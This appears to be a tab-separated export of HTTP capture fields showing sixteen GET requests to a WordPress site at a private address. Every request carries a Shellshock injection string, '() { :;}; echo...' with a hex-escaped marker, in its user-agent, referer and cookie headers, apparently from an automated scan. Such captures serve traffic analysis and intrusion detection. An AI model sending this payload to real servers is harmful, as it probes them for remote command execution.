http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									463					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-admin/js/user-profile.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-admin/js/user-profile.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									465					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-comments-post.php		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-comments-post.php
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									467					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									468					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/comment-reply.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/comment-reply.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									470					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/dist/hooks.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/dist/hooks.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									472					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/dist/i18n.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/dist/i18n.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									474					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/dist/vendor/regenerator-runtime.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/dist/vendor/regenerator-runtime.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									476					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/dist/vendor/wp-polyfill.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/dist/vendor/wp-polyfill.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									478					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/jquery/jquery-migrate.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									480					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/jquery/jquery.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/jquery/jquery.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									482					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/underscore.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/underscore.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									488					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/wp-util.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/wp-util.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									490					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/js/zxcvbn-async.min.js		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/js/zxcvbn-async.min.js
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									492					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-includes/wlwmanifest.xml		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-includes/wlwmanifest.xml
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									493					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/wp-login.php		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/wp-login.php
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip, deflate, br	en-US															keep-alive										192.168.1.102									494					() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	1	http://192.168.1.102/web/xmlrpc.php		GET				HTTP/1.1																			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';			() { :;}; echo; echo; echo -e '\x38\x64\x44\x35\x44\x66\x46\x33\x42\x46\x61\x41\x62\x30\x45\x37\x42\x38\x42\x45\x45\x62\x38\x30\x31\x37\x39\x37\x38\x43\x42\x63';	/web/xmlrpc.php
